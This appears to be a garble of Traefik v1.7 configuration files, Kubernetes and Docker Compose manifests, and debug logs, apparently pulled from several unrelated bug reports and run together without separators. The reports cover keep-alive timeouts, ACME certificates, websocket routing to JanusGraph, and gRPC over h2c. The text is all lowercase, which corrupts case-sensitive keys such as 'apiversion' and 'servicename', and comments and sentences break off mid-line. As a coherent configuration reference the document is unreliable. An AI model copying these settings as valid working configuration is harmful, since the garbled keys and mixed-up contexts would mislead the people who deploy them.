[accesslog.fields.names]
[accesslog.fields.headers] defaultmode = "keep"
[accesslog.fields.headers.names] [accesslog.filters] statuscodes = ["400-602"]
[metrics] [metrics.datadog] address = "datadog-agent-datadog.datadog.svc.cluster.local:8125" pushinterval = "10s"
``` im also running using this:
``` --retry.attempts=10 --forwardingtimeouts.dialtimeout=60s --forwardingtimeouts.responseheadertimeout=60s
``` my uwsgi config: ```
;
http = :8080
plugin= http
wsgi-file = main.py
callable = wsgi_application
processes = 10
enable-threads = true
master = true
die-on-term = true
reload-mercy = 30
worker-reload-mercy = 30
log-5xx = true
log-4xx = true
disable-logging = true
stats = 127.0.0.1:1717
stats-http = true
single-interpreter= true
;
;traefik is 90 seconds, non-configurable
http-keepalive=100
add-header = connection: keep-alive
so-keepalive= true
http-auto-chunked = true
;
http-timeout = 120
socket-timeout = 120
vacuum = true
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) i'm afraid to use the debug level log, as it will spam my logging system, any chance to increase logging only on errors?
```toml [acme] email = "..." storage = "/etc/traefik/acme.json" entrypoint = "https" onhostrule = true acmelogging = true [acme.httpchallenge] entrypoint = "http" [[acme.domains]] main = "primary" [[acme.domains]] main = "other1" [[acme.domains]] main = "other2"
``` while my current config does not contain san certfificates, it seems that i had them configured at one point as they are found in the `acme.json`: ```json { "domain": { "main": "primary", "sans": null }, "certificate": "ls..=", "key": "ls.." }, { "domain": { "main": "primary", "sans": [ "other1", "other2" ] }, "certificate": "ls0...=", "key": "ls0..." }, { "domain": { "main": "primary", "sans": [ "other3", "other2" ] }, "certificate": "ls0...==", "key": "ls0..." },
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": false, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "info", "entrypoints": { "dashboard": { "address": "xxxx", "tls": { "minversion": "versiontls12", "ciphersuites": [], "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false }, "defaultcertificate": null, "snistrict": false }, "redirect": null, "auth": { "basic": {} }, "whitelistsourcerange": null, "whitelist": {}, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "healthcheck": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "http": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": true, "proxyprotocol": null, "forwardedheaders": { "insecure": false, "trustedips": [] } }, "https": { "address": "xxxx", "tls": { "minversion": "versiontls12", "ciphersuites": [], "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false }, "defaultcertificate": null, "snistrict": false }, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": true, "proxyprotocol": null, "forwardedheaders": { "insecure": false, "trustedips": [] } } }, "cluster": null, "constraints": [], "acme": { "email": "xxxx", "domains": null, "storage": "xxxx", "storagefile": "", "ondemand": false, "onhostrule": false, "caserver": "", "entrypoint": "xxxx", "keytype": "xxxx", "dnschallenge": null, "httpchallenge": null, "tlschallenge": null, "dnsprovider": "", "delaydontcheckdns": 0, "acmelogging": false, "overridecertificates": false, "tlsconfig": null }, "defaultentrypoints": [ "http", "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": true, "rootcas": null, "retry": { "attempts": 20 }, "healthcheck": { "interval": 60000000000 }, "respondingtimeouts": { "readtimeout": 0, "writetimeout": 0, "idletimeout": 360000000000 }, "forwardingtimeouts": { "dialtimeout": 30000000000, "responseheadertimeout": 0 }, "allowminweightzero": false, "keeptrailingslash": false, "web": null, "docker": { "watch": true, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "domain": "", "tls": null, "exposedbydefault": false, "usebindportip": false, "swarmmode": true, "network": "", "swarmmoderefreshseconds": 20 }, "file": { "watch": true, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "directory": "", "traefikfile": "" }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": { "entrypoint": "dashboard", "dashboard": true, "debug": false, "currentconfigurations": null, "statistics": null }, "metrics": null, "ping": { "entrypoint": "healthcheck" }, "hostresolver": null, "configfile": "/container/traefik.toml"
``` the configuration on each docker container looks like: ```yaml
labels: - traefik.enable=true - traefik.docker.network=xxx - traefik.port=8080 - traefik.weight=10 - traefik.frontend.errors.network.backend=error - traefik.frontend.errors.network.query=/{status}.html - traefik.frontend.errors.network.status=400,401,405,408,429,500-599 - traefik.frontend.headers.stsincludesubdomains=true - traefik.frontend.headers.stspreload=true - traefik.frontend.headers.stsseconds=315360000 - traefik.frontend.passhostheader=true - traefik.frontend.priority=10 - traefik.frontend.redirect.entrypoint=https - traefik.frontend.redirect.permanent=true - traefik.frontend.rule=host:xxx - traefik.backend.loadbalancer.method=drr - traefik.backend.loadbalancer.stickiness.cookiename=xxx - traefik.backend.loadbalancer.stickiness=true - traefik.backend.loadbalancer.swarm=true
``` --- i will try to create a pprof statistic
i have to check how this is done first.
apiversion: v1
kind: serviceaccount
metadata: name: traefik-ingress-controller namespace: kube-system
kind: daemonset
apiversion: extensions/v1beta1
metadata: name: traefik-ingress-controller namespace: kube-system labels: k8s-app: traefik-ingress-lb app: traefik
spec: template: metadata: labels: k8s-app: traefik-ingress-lb name: traefik-ingress-lb spec: serviceaccountname: traefik-ingress-controller terminationgraceperiodseconds: 60 containers: - image: traefik name: traefik-ingress-lb ports: - name: http containerport: 80 hostport: 80 - name: admin containerport: 8080 hostport: 8080 securitycontext: capabilities: drop: - all add: - net_bind_service args: - --api - --kubernetes - --loglevel=debug - --sendanonymoususage=true - --metrics.prometheus=true - --accesslog.format=json
kind: service
apiversion: v1
metadata: name: traefik-ingress-service namespace: kube-system
spec: type: nodeport selector: k8s-app: traefik-ingress-lb ports: - protocol: tcp port: 80 nodeport: 30080 name: web - protocol: tcp port: 8080 nodeport: 30088 name: admin
ingress.yaml
apiversion: extensions/v1beta1
kind: ingress
metadata: name: missing
spec: backend: servicename: missing serviceport: 80
{ "apiversion": "extensions/v1beta1", "kind": "deployment", "metadata": { "name": "missing" }, "spec": { "replicas": 1, "template": { "metadata": { "labels": { "app": "missing", "name": "missing" }, "name": "missing" }, "spec": { "containers": [ { "image": "nginxdemos/hello", "name": "app", "ports": [ { "containerport": 80, "name": "http" } ] } ] } } }
service.json
{ "apiversion": "v1", "metadata": { "name": "missing" }, "kind": "service", "spec": { "ports": [ { "targetport": 80, "protocol": "tcp", "port": 80, "name": "http" } ], "selector": { "app": "missing" } }
ui-ict.yaml
apiversion: v1
kind: service
metadata: name: traefik-web-ui namespace: kube-system
spec: selector: k8s-app: traefik-ingress-lb ports: - name: web port: 80 targetport: 8080
apiversion: extensions/v1beta1
kind: ingress
metadata: name: traefik-web-ui namespace: kube-system
spec: rules: - host: dashboard.example.com http: paths: - path: / backend: servicename: traefik-web-ui serviceport: web
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2019-02-04t20:53:40z" level=info msg="traefik version v1.7.8 built on 2019-01-29_04:33:36pm"
time="2019-02-04t20:53:40z" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":false,\\"checknewversion\\":true,\\"sendanonymoususage\\":true,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":{\\"format\\":\\"json\\"},\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":null,\\"tracing\\":null,\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"traefik\\":{\\"address\\":\\":8080\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":null,\\"defaultentrypoints\\":[\\"http\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"keeptrailingslash\\":false,\\"web\\":null,\\"docker\\":null,\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":null},\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":{\\"entrypoint\\":\\"traefik\\",\\"dashboard\\":true,\\"debug\\":false,\\"currentconfigurations\\":null,\\"statistics\\":null},\\"metrics\\":{\\"prometheus\\":{\\"buckets\\":[0.1,0.3,1.2,5],\\"entrypoint\\":\\"traefik\\"},\\"datadog\\":null,\\"statsd\\":null,\\"influxdb\\":null},\\"ping\\":null,\\"hostresolver\\":null}"
time="2019-02-04t20:53:40z" level=info msg="\ stats collection is enabled.\ many thanks for contributing to traefik\'s improvement by allowing us to receive anonymous information from your configuration.\ help us improve traefik by leaving this feature on :)\ more details on: #collected-data\ "
time="2019-02-04t20:53:40z" level=debug msg="configured prometheus metrics"
time="2019-02-04t20:53:40z" level=info msg="preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-02-04t20:53:40z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-02-04t20:53:40z" level=info msg="starting server on :80"
time="2019-02-04t20:53:40z" level=info msg="starting server on :8080"
time="2019-02-04t20:53:40z" level=info msg="starting provider configuration.provideraggregator {}"
time="2019-02-04t20:53:40z" level=info msg="starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":null}"
time="2019-02-04t20:53:40z" level=debug msg="using ingress label selector: \\"\\""
time="2019-02-04t20:53:40z" level=info msg="ingress label selector is: \\"\\""
time="2019-02-04t20:53:40z" level=info msg="creating in-cluster provider client"
time="2019-02-04t20:53:40z" level=debug msg="received kubernetes event kind *v1.service"
time="2019-02-04t20:53:40z" level=warning msg="endpoints not available for kube-system/traefik-web-ui"
time="2019-02-04t20:53:40z" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"global-default-backend\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"dashboard.example.com/\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"global-default-frontend\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"global-default-backend\\",\\"routes\\":{\\"/\\":{\\"rule\\":\\"pathprefix:/\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"dashboard.example.com/\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"dashboard.example.com/\\",\\"routes\\":{\\"/\\":{\\"rule\\":\\"pathprefix:/\\"},\\"dashboard.example.com\\":{\\"rule\\":\\"host:dashboard.example.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
time="2019-02-04t20:53:40z" level=debug msg="wiring frontend global-default-frontend to entrypoint http"
time="2019-02-04t20:53:40z" level=debug msg="creating backend global-default-backend"
time="2019-02-04t20:53:40z" level=debug msg="adding tlsclientheaders middleware for frontend global-default-frontend"
time="2019-02-04t20:53:40z" level=debug msg="creating load-balancer wrr"
time="2019-02-04t20:53:40z" level=debug msg="creating route / pathprefix:/"
time="2019-02-04t20:53:40z" level=debug msg="wiring frontend dashboard.example.com/ to entrypoint http"
time="2019-02-04t20:53:40z" level=debug msg="creating backend dashboard.example.com/"
time="2019-02-04t20:53:40z" level=debug msg="adding tlsclientheaders middleware for frontend dashboard.example.com/"
time="2019-02-04t20:53:40z" level=debug msg="creating load-balancer wrr"
time="2019-02-04t20:53:40z" level=debug msg="creating route dashboard.example.com host:dashboard.example.com"
time="2019-02-04t20:53:40z" level=debug msg="creating route / pathprefix:/"
time="2019-02-04t20:53:40z" level=info msg="server configuration reloaded on :8080"
time="2019-02-04t20:53:40z" level=info msg="server configuration reloaded on :80"
time="2019-02-04t20:53:40z" level=debug msg="received kubernetes event kind *v1.secret"
time="2019-02-04t20:53:40z" level=warning msg="endpoints not available for kube-system/traefik-web-ui"
time="2019-02-04t20:53:40z" level=debug msg="skipping kubernetes event kind *v1.secret"
time="2019-02-04t20:53:40z" level=debug msg="received kubernetes event kind *v1.secret"
time="2019-02-04t20:53:40z" level=warning msg="endpoints not available for kube-system/traefik-web-ui"
time="2019-02-04t20:53:40z" level=debug msg="skipping kubernetes event kind *v1.secret"
time="2019-02-04t20:53:40z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:40z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:40z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:40z" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"global-default-backend\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"dashboard.example.com/\\":{\\"servers\\":{\\"traefik-ingress-controller-99qvr\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"global-default-frontend\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"global-default-backend\\",\\"routes\\":{\\"/\\":{\\"rule\\":\\"pathprefix:/\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"dashboard.example.com/\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"dashboard.example.com/\\",\\"routes\\":{\\"/\\":{\\"rule\\":\\"pathprefix:/\\"},\\"dashboard.example.com\\":{\\"rule\\":\\"host:dashboard.example.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
time="2019-02-04t20:53:40z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:40z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:41z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:41z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:42z" level=debug msg="wiring frontend global-default-frontend to entrypoint http"
time="2019-02-04t20:53:42z" level=debug msg="creating backend global-default-backend"
time="2019-02-04t20:53:42z" level=debug msg="adding tlsclientheaders middleware for frontend global-default-frontend"
time="2019-02-04t20:53:42z" level=debug msg="creating load-balancer wrr"
time="2019-02-04t20:53:42z" level=debug msg="creating route / pathprefix:/"
time="2019-02-04t20:53:42z" level=debug msg="wiring frontend dashboard.example.com/ to entrypoint http"
time="2019-02-04t20:53:42z" level=debug msg="creating backend dashboard.example.com/"
time="2019-02-04t20:53:42z" level=debug msg="adding tlsclientheaders middleware for frontend dashboard.example.com/"
time="2019-02-04t20:53:42z" level=debug msg="creating load-balancer wrr"
time="2019-02-04t20:53:42z" level=debug msg="creating server traefik-ingress-controller-99qvr at with weight 1"
time="2019-02-04t20:53:42z" level=debug msg="creating route / pathprefix:/"
time="2019-02-04t20:53:42z" level=debug msg="creating route dashboard.example.com host:dashboard.example.com"
time="2019-02-04t20:53:42z" level=info msg="server configuration reloaded on :80"
time="2019-02-04t20:53:42z" level=info msg="server configuration reloaded on :8080"
time="2019-02-04t20:53:42z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:42z" level=debug msg="skipping kubernetes event kind *v1.endpoints"
time="2019-02-04t20:53:43z" level=debug msg="received kubernetes event kind *v1.endpoints"```
defaultentrypoints = ["http","https"]
checknewversion = false
providersthrottleduration = 5
maxidleconnsperhost = 400
rootcas = [ "/usr/local/share/ca-certificates/root.crt" ] [traefiklog] filepath = "/dev/stdout" format = "common" [entrypoints] [entrypoints.gremlin] address = ":8182" [entrypoints.gremlin.tls] [[entrypoints.gremlin.tls.certificates]] certfile = "/etc/ssl/sec.crt" keyfile = "/etc/ssl/sec.key" [docker]
endpoint = "unix:///var/run/docker.sock"
swarmmode = true
watch = true [lifecycle]
requestacceptgracetimeout = "60s"
gracetimeout = "720s" [respondingtimeouts]
idletimeout = "720s" [forwardingtimeouts]
dialtimeout = "720s"
docker-compose.yml for janusgraph
version: '3.4' services: janusgraph: image: janusgraph:0.3.1 networks: default: traefik: deploy: labels: - traefik.port=8182 - traefik.docker.network=management - traefik.frontend.rule=hostregexp:janusgraph.{domain:.+} - traefik.frontend.entrypoints=gremlin resources: reservations: memory: 1500m cpus: '0.5' mode: replicated replicas: 1 networks: default: traefik: external: name: management
docker-compose.yml for traefik
version: '3.3'
services: traefik: image: "docker_traefik_image" command: --configfile=/etc/traefik/traefik.toml --debug networks: - traefik ports: - target: 80 published: 80 protocol: tcp mode: host - target: 443 published: 443 protocol: tcp mode: host - target: 8182 published: 8182 protocol: tcp mode: host volumes: - /var/run/docker.sock:/var/run/docker.sock deploy: mode: global update_config: parallelism: 1 delay: 5s placement: constraints: - node.role == manager networks: traefik: external: name: management
docker-compose.yml for nginx
```yml nginx-proxy: image: "docker_nginx_proxy_image" ports: - 8182:8182 networks: - default deploy: mode: global update_config: parallelism: 1 delay: 5s placement: constraints: - node.role == manager
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch)
i see a lot of these log lines.
time="2019-01-31t07:43:55z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"10.0.0.95:8182\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"upgrade\\"],\\"sec-websocket-key\\":[\\"l2wtu2tzleivtaeiucar1a==\\"],\\"sec-websocket-version\\":[\\"13\\"],\\"upgrade\\":[\\"websocket\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"janusgraph.tld:8182\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.18.0.1:51780\\",\\"requesturi\\":\\"/gremlin\\",\\"tls\\":null}"
loglevel = "debug" defaultentrypoints = ["http"] [retry] attempts = 3 [entrypoints] [entrypoints.http] address = ":80" [file] [backends] [backends.backend1] [backends.backend1.servers.server1] url = "h2c://backend:50051" [frontends] [frontends.frontend1] backend = "backend1" [frontends.frontend1.routes.test_1] rule = "host:localhost"
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
debu[2019-01-26t14:37:34z] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/helloworld.greeter/sayhello\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-netty/1.18.0\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.18.0.1:47744\\",\\"requesturi\\":\\"/helloworld.greeter/sayhello\\",\\"tls\\":null}"
debu[2019-01-26t14:37:34z] vulcand/oxy/roundrobin/rr: forwarding this request to url request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/helloworld.greeter/sayhello\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-netty/1.18.0\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.18.0.1:47744\\",\\"requesturi\\":\\"/helloworld.greeter/sayhello\\",\\"tls\\":null}" forwardurl="h2c://172.18.0.3:50051"
debu[2019-01-26t14:37:34z] vulcand/oxy/forward: begin servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.18.0.3:50051\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-netty/1.18.0\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.18.0.1:47744\\",\\"requesturi\\":\\"/helloworld.greeter/sayhello\\",\\"tls\\":null}"
debu[2019-01-26t14:37:34z] vulcand/oxy/forward/http: begin servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.18.0.3:50051\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-netty/1.18.0\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.18.0.1:47744\\",\\"requesturi\\":\\"/helloworld.greeter/sayhello\\",\\"tls\\":null}"
debu[2019-01-26t14:37:34z] vulcand/oxy/forward/http: round trip: h2c://172.18.0.3:50051, code: 200, length: 18, duration: 10.0082ms
debu[2019-01-26t14:37:34z] vulcand/oxy/forward/http: completed servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.18.0.3:50051\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-netty/1.18.0\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.18.0.1:47744\\",\\"requesturi\\":\\"/helloworld.greeter/sayhello\\",\\"tls\\":null}"
debu[2019-01-26t14:37:34z] vulcand/oxy/forward: completed servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.18.0.3:50051\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-netty/1.18.0\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.18.0.1:47744\\",\\"requesturi\\":\\"/helloworld.greeter/sayhello\\",\\"tls\\":null}"
debu[2019-01-26t14:37:34z] vulcand/oxy/roundrobin/rr: completed servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/helloworld.greeter/sayhello\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-netty/1.18.0\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.18.0.1:47744\\",\\"requesturi\\":\\"/helloworld.greeter/sayhello\\",\\"tls\\":null}"
platform kubernetes 1.11 this is not a major issue, i'll try to submit a pr next week if this issue makes sense to you.
<summary>configuration</summary> ```toml
################################################################
# global configuration
################################################################ # enable debug mode
# default: false
# debug = true # log level
# default: "error"
loglevel = "debug" # entrypoints to be used by frontends that do not specify any entrypoint.
# each frontend can specify its own entrypoints.
# default: ["http"]
defaultentrypoints = ["http", "https"] # entrypoints definition
[entrypoints] [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] entrypoint = "https" [entrypoints.traefik] address = ":8080" compress = true # dummy backend and root www redirection
[file] filename = "/etc/traefik.d/www-redir.toml" # letsencrypt configuration
[acme] email = "acmesetup@vdomain"
storage = "traefik/acme/account"
entrypoint = "https" # comment the following line to go to prod
caserver = " " acmelogging = true [acme.dnschallenge] provider = "gcloud" [[acme.domains]] main = "*.vdomain" sans = ["vdomain"] # traefik logs
# enabled by default and log to stdout
# [traefiklog] # sets the filepath for the traefik log
if not specified, stdout will be used.
# intermediate directories are created if necessary.
# default: os.stdout
# filepath = "log/traefik.log" # format is either "json" or "common".
# default: "common"
# format = "common" # enable access logs
# by default it will write to stdout and produce logs in the textual
# common log format (clf), extended with additional fields.
# [accesslog] # sets the file path for the access log
if not specified, stdout will be used.
# intermediate directories are created if necessary.
# default: os.stdout
# filepath = "/path/to/log/log.txt" # format is either "json" or "common".
# default: "common"
# format = "common" ################################################################
# web configuration backend
################################################################ # enable web configuration backend api/ping
[api] entrypoint = "traefik"
dashboard = true [ping] entrypoint = "traefik" ################################################################
# docker configuration backend
################################################################ # enable docker configuration backend
# [docker] # docker server endpoint
can be a tcp or a unix socket endpoint.
# default: "unix:///var/run/docker.sock"
# endpoint = "tcp://10.10.10.10:2375" # default domain used.
# can be overridden by setting the "traefik.domain" label on a container.
# default: ""
